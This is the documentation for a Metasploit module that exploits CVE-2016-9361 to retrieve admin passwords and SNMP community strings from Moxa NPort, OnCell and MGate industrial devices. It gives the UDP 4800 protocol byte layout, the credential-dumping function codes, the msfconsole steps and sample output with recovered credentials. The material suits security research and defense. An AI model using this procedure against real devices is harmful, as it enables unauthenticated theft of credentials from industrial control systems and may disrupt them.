## Vulnerable Application
  Many Moxa devices make use of a protocol that is vulnerable to unauthenticated credential retrieval via exploitation of CVE-2016-9361.  The service is known 
  to be used on Moxa devices in the NPort, OnCell, and MGate product lines.
  
  This module leverages CVE-2016-9361 to retrieve admin passwords and SNMP 
  community strings, as well as enumerate all possible function codes.  The supporting research and Metasploit module are the work of Patrick DeSantis 
  of Cisco Talos and K. Reid Wightman.

  The module has been tested on Moxa NPort 6250 firmware v1.13, MGate MB3170 
  firmware v2.5, and NPort 5110 firmware v2.6.

### The Moxa Protocol
  The Moxa protocol listens on 4800/UDP and will respond to broadcast or direct traffic.  The protocol is utilized by devices in several product lines and 
  Moxa applications in order to manage and configure network-deployed devices.

#### Discovery / Identify
  A discovery packet compels a Moxa device to respond to the sender with some
  basic device information that is needed for more advanced functions.  The 
  discovery data is 8 bytes in length and is the most basic example of the Moxa protocol.  It may be sent out as a broadcast (destination 255.255.255.255) or
  to an individual device.

  The discovery request contains the bytes:
```
  \x01\x00\x00\x08\x00\x00\x00\x00
```
  Where the function code (first byte) 0x01 is Moxa discovery/identify
  and the fourth byte is the length of the full data payload.

##### Discovery Response
  A valid response is 24 bytes, starts with 0x81, and contains the values
  0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.
  
  A response with a value of 0x04 for the second byte indicates that an invalid
  function code was used in the corresponding request.

  The response can be broken down as follows:

  * Byte 0x0 identifies the packet as a response to the request. The first byte of a response will always be the FC + 0x80 (the most significant bit of the byte is set to 1, so 0b00000001 becomes 0b10000001, or 0x81 as response to identify 0x01).
  * Bytes 0x1-0x2 are unknown, may be padding
  * Byte 0x3 is the length of the datagram payload
  * Bytes 0x4-0x7 are unknown, may be padding
  * Bytes 0x8-0x9 may be the product line in little endian.  For example, an NPort 6250 is part of the 6000 line, so bytes 8 and 9 will be 0x00 and 0x60 respectively.
  * Bytes 0xA-0xB are unknown but always seem to be 0x00 and 0x80 respectively.
  * Bytes 0xC-0xD are the model number in little endian, so the NPort 6250 is 0x50 and 0x62 respectively.
  * Bytes 0xE-0x13 are the MAC address of the device
  * Bytes 0x14-0x17 are the IP address

  Here's a sample response from an NPort 6250 with the default IP address of 192.168.127.254 and a MAC of 00:90:e8:15:1c:22:
```
  0000  81  00  00  18  00  00  00  00  00  60  00  80  50  62  00  90
  0010  e8  15  1c  22  c0  a8  7f  fe	 	 	 	 	 	 	 	 

  Model:  0x50 0x60 = 6250
  MAC:  00:90:e8:15:1c:22
  IP: c0:a8:7f:fe = 192.168.127.254
```
#### Other Functions
  The values from the response are then used to craft a new request with the below format:

  * Byte 0x0 is the function code
  * Bytes 0x1-0x2 are unknown, may be padding
  * Byte 0x3 is the length of the datagram payload
  * Bytes 0x4-0x7 are unknown, may be padding
  * Bytes 0x8-0x9 are the product line in little endian
  * Bytes 0xA-0xB are the unknown 0x00 0x80
  * Bytes 0xC-0xD is the model number in big endian
  * Bytes 0xE-0x13 is the MAC

  The module takes a valid response from discovery/ident and parses out the appropriate bytes to use as a "tail" which is appended to all subsequent requests.
```
  tail = response[8..24]
```
  The tail is then used as shown below:
```
  datagram = fc[func] + "\x00\x00\x14\x00\x00\x00\x00" + tail
```
  For all function codes other than identify (0x01), as long as the "tail" values in the request match those of the target, the device will execute the function defined by the value in byte 0x0.

##### Other Known and Suspected Function Codes
  Function codes fall in the range of 0x01 to 0x7F.

  The below function codes are included in the module, even if unused.  The intent is that the user may modify the module as needed to make use of other function codes.
```
  'ident'         =>  "\x01",   # identify device
  'name'          =>  "\x10",   # get the "server name" of the device
  'netstat'       =>  "\x14",   # network activity of the device
  'unlock1'       =>  "\x16",   # "unlock" some devices, including 5110, MGate
  'date_time'     =>  "\x1a",   # get the device date and time
  'time_server'   =>  "\x1b",   # get the time server of device
  'unlock2'       =>  "\x1e",   # "unlock" 6xxx series devices
  'snmp_read'     =>  "\x28",   # snmp community strings
  'pass'          =>  "\x29",   # admin password of some devices
  'all_creds'     =>  "\x2c",   # snmp comm strings and admin password of 6xxx
```

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/scada/moxa_credentials_recovery```
  3. Do: ```set RHOST <target IP>```
  4. Do: ```run```
  5. Any found credentials will be stored in loot (set VERBOSE to TRUE to have credentials output to console)

## Options

  **RHOST**

  Target device.

  **FUNCTION**

  Either CREDS (default) or ENUM:
  * CREDS attempts to retrieve administrative password and SNMP community strings
  * ENUM will enumerate all function codes in the range 0x2..0x7F

## Scenarios
### Check
  The module implements a check function to determine if a target "speaks" the Moxa protocol.  It does this using the 0x01 function code and checking for a valid response of 24 bytes, starting with 0x81, and containing the values 0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.
```
if response[0] == "\x81" && response[14..16] == "\x00\x90\xe8" && response.length == 24
```
### Output Hexdump to Console
  To output hexdump responses to console:
  ```
  msf > use auxiliary/admin/scada/moxa_credentials_recovery
  msf auxiliary(moxa_credentials_recovery) > set RHOST <target IP>
  msf auxiliary(moxa_credentials_recovery) > set VERBOSE TRUE
  msf auxiliary(moxa_credentials_recovery) > run
  ```
  Sample verbose output:
  ```
  ... SNIP...
  [*] Response:
  90 00 00 3c 00 00 00 00 00 60 00 80 50 62 00 90    |...<.....`..Pb..|
  e8 15 1c 22 4e 50 36 32 35 30 5f 35 38 39 36 00    |..."NP6250_5896.|
  10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00    |................|
  18 00 19 00 1a 00 1b 00 1c 00 1d 00                |............|
  ... SNIP ...

  [*] snmp community retrieved: public_admin
  [*] snmp read/write community retrieved: private_admin
  [*] password retrieved: secretpassword
  ... SNIP ...
  ```

### Enumerate All Function Codes
  To enumerate ALL function codes :

  ```
  msf > use auxiliary/admin/scada/moxa_credentials_recovery
  msf auxiliary(moxa_credentials_recovery) > set RHOST <target IP>
  msf auxiliary(moxa_credentials_recovery) > set FUNCTION ENUM
  msf auxiliary(moxa_credentials_recovery) > run
  ```
  Sample ENUM output:
  ```
  ... SNIP...
  [*] Function Code: 14    |.|


  [*] Response:
  94 00 01 08 00 00 00 00 00 60 00 80 50 62 00 90    |.........`..Pb..|
  e8 15 1c 22 0f 00 00 00 00 00 00 00 00 00 00 00    |..."............|
  00 00 00 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|
  00 00 c0 12 00 00 ff 00 00 00 00 00 00 00 00 00    |................|
  00 00 a1 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|
  00 00 89 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|
  00 00 24 13 01 01 ff 00 00 00 00 00 00 00 00 00    |..$.............|
  00 00 b5 03 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|
  00 00 34 3a 01 01 00 00 00 00 00 00 c0 a8 7f fe    |..4:............|
  00 00 17 00 01 01 00 00 00 00 00 00 c0 a8 7f fe    |................|               
  ... SNIP ...

  ```
  Note that the above response is an example of the utility of using ENUM.  This function code (0x14) returns a netstat-type response.  Output similar to the above will be displayed for every function code that does not return 'invalid' (0x4).  This may also be useful for devices that do not "unlock" using the function codes supplied in this module; by running through all function codes in sequence, it is likely that an alternate "unlock" function will be sent prior to any function codes that request credentials.

  NOTE: As the protocol is undocumented and the purpose of a majority of the function codes are unknown, undesired results are possible.  Do NOT use on devices which are mission-critical!